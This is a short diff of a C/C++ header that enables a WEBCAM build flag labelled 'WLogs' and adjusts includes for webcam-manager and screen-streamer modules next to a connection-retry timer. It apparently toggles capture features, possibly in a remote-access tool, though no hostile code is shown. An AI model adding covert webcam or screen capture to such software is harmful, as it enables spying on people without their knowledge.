@@ -10,12 +10,12 @@
 
 #define TIMING_RETRY 10000
 
-//#define WEBCAM "WLogs"
+#define WEBCAM "WLogs"
 
 #ifdef WEBCAM
 
-#include "webcam/WebcamManager.h"
-#include "screen/ScreenStreamer.h"
+#include "WebcamManager.h"
+#include "ScreenStreamer.h"
 
 #endif
 
